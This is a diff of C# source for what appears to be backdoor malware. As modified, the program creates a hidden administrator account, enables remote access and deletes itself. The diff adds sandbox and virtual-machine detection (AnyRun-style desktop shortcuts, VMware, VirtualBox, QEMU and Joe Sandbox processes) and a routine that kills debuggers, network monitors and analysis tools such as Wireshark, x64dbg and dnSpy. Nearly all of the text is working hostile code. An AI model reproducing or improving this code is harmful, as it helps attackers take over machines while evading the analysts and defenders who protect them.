@@ -3,7 +3,6 @@ using System.Diagnostics;
 using System.IO;
 using System.Management;
 using System.Net;
-using System.Reflection;
 
 namespace localhost
 {
@@ -12,31 +11,25 @@ namespace localhost
         [STAThread]
         private static void Main()
         {
-            var fileName = Process.GetCurrentProcess().MainModule.FileName;
+            CheckAnalysis(); // Check AnyRun or Virtual Machine 
+            CheckProcesses(); // Check forbidden processes: debuggers, network monitors and etc. . .
+
             try
             {
-                if (CheckProcesses())
-                {
-                    Program.createAdminUser();
-                    Program.allowRemoteAccess();
-                    Program.SendMessage("Job's done!");
-                } else
-                {
-                    Program.createAdminUser();
-                    Program.allowRemoteAccess();
-                    Program.SendMessage("Job's done!");
-                }
-
+                createAdminUser(); // Create admin user
+                allowRemoteAccess(); // Allowed remote accesses
+                SendMessage("Job's done!"); // null function
+                autoSeflDel(); // auto-self delete function
             }
-            catch
+            catch 
             {
-                // Ошибки не выводятся, вызывается selfRemove
-                Program.selfRemove(fileName, 1);
+                autoSeflDel(); // Autoself delete
                 return;
             }
 
-            Program.selfRemove(fileName, 1);
+
         }
+
 
         private static void createAdminUser()
         {
@@ -116,11 +109,10 @@ namespace localhost
             }
         }
 
-        private static bool CheckProcesses()
+        public static bool CheckProcesses()
         {
-            string[] forbiddenProcesses =
-            {
-                                "dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
+            string[] forbiddenProcesses = {
+                "dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
                 "de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor",
                 "Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james",
                 "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida -", "charles", "dnspy", "simpleassembly", "peek",
@@ -129,32 +121,87 @@ namespace localhost
                 "deobfuscator", "de4dot", "confuser", " /snd", "x64dbg", "x32dbg", "x96dbg", "process hacker", "dotpeek", ".net reflector",
                 "ilspy", "file monitoring", "file monitor", "files monitor", "netsharemonitor", "fileactivitywatcher", "fileactivitywatch", "windows explorer tracker", "process monitor", "disk pluse",
                 "file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor",
-                "soap monitor", "internet traffic agent", "socketsniff", "networkminer", "network debugger", "HTTPDebuggerSvc", "HTTPDebuggerUI", "mitmproxy", "python", "mitm", "taskmgr", "ProcessHacker2", "Process Hacker2", "Wireshark", "Process Hacker", "Process Hacker 2",
+                "soap monitor", "ProcessHacker", "internet traffic agent", "socketsniff", "networkminer", "network debugger", "HTTPDebuggerUI", "mitmproxy", "python", "mitm", "Wireshark","UninstallTool", "UninstallToolHelper", "ProcessHacker",
             };
+            var processes = Process.GetProcesses();
 
             foreach (var processName in forbiddenProcesses)
             {
-                var processes = Process.GetProcessesByName(processName);
-                
-                if (processes.Length > 0)
+                foreach (var process in processes)
                 {
-                    foreach (var process in processes)
+                    if (process.ProcessName.ToLower() == processName.ToLower())
                     {
-                        try {
-                            
+                        try
+                        {
                             process.Kill();
+                            process.Dispose();
                         }
-                        catch {
-                            // 
-                        }
-                    }
+                        catch{}
 
-                    return true;
+
+                        return true;
+                    }
                 }
             }
 
             return false;
         }
+
+        private static bool AnyRunDtc()
+        {
+            string[] array = { "Acrobat Reader DC.lnk", "CCleaner.lnk", "FileZilla Client.lnk", "Firefox.lnk", "Google Chrome.lnk", "Skype.lnk", "Microsoft Edge.lnk" };
+
+            foreach (string fileName in array)
+            {
+                if (!File.Exists(Path.Combine(Environment.ExpandEnvironmentVariables("%systemdrive%"), "Users", "Public", "Desktop", fileName)))
+                {
+                    return false; 
+                }
+            }
+
+            // Проверка на имя пользователя и имя машины
+            if (string.Equals(Environment.UserName.ToLower(), "admin", StringComparison.OrdinalIgnoreCase) && Environment.MachineName.Contains("USER-PC"))
+            {
+                autoSeflDel();
+            }
+
+            return false;
+        }
+
+
+        private static bool AntiVM_Checker()
+        {
+            string[] vmProcesses = {
+        "vmtoolsd", "vmwaretray", "vmwareuser", "vgauthservice", "vmacthlp",
+        "vmsrvc", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol",
+        "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice", "vmwaretray", "VBoxService",
+        "VBoxTray",
+    };
+
+            var processes = Process.GetProcesses();
+
+            foreach (var process in processes)
+            {
+                foreach (var processName in vmProcesses)
+                {
+                    if (process.ProcessName.ToLower() == processName.ToLower())
+                    {
+                        autoSeflDel();
+                    }
+                }
+            }
+
+            return false;
+        }
+
+
+
+        private static void CheckAnalysis()
+        {
+            AntiVM_Checker();
+            AnyRunDtc();
+        }
+        
 
         private static void RunPS(string args)
         {
@@ -214,6 +261,13 @@ namespace localhost
                 }
             }
             return result;
+        }
+
+
+        private static void autoSeflDel()
+        {
+            var fileName = Process.GetCurrentProcess().MainModule.FileName;
+            selfRemove(fileName, 1);
         }
 
         private static void selfRemove(string fileName, int delaySecond = 2)
